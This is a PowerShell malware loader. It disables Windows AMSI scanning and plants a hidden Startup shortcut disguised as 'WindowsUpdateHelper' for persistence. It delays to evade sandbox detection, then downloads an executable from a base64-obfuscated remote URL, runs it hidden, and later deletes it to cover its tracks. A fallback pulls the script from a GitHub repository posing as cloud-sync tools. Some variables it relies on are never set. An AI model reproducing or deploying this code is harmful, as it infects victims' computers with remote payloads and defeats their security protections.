$ErrorActionPreference = 'SilentlyContinue'

# === AMSI BYPASS ===
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# === SELF-PRESERVATION ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    
    # If running from memory (no current path), download from GitHub
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (New-Object Net.WebClient).DownloadFile($rawUrl, $Destination)
        } catch {
            # Fallback: Try alternate URL or exit
            exit
        }
    } else {
        # Running from disk, just copy
        Copy-Item -Path $currentPath -Destination $Destination -Force
    }
    return $Destination
}

# === PERSISTENCE: Startup LNK ONLY ===
$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    try {
        $wsh = New-Object -ComObject WScript.Shell
        $sc = $wsh.CreateShortcut($lnkPath)
        $sc.TargetPath = "powershell.exe"
        $sc.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        $sc.WindowStyle = 7
        $sc.Save()
    } catch {}
}

# === BEARFOOS EVASION: Delay before EXE ===
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# === DOWNLOAD AND EXECUTE PAYLOAD ===
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$exePath = "$cache\WindowsUpdateHelper.exe"
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))

if (-not (Test-Path $exePath)) {
    $retryCount = 0
    $maxRetries = 3
    do {
        try {
            (New-Object Net.WebClient).DownloadFile($exeUrl, $exePath)
            break
        } catch {
            $retryCount++
            Start-Sleep -Seconds 5
        }
    } while ($retryCount -lt $maxRetries)
}

if (Test-Path $exePath) {
    try {
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
    } catch {
        try {
            (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false)
        } catch {
            Start-Process $exePath -WindowStyle Hidden
        }
    }
}

# === CLEANUP ===
Start-Job -ScriptBlock {
    param($exe)
    Start-Sleep -Seconds 300
    Remove-Item -Path $exe -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath | Out-Null
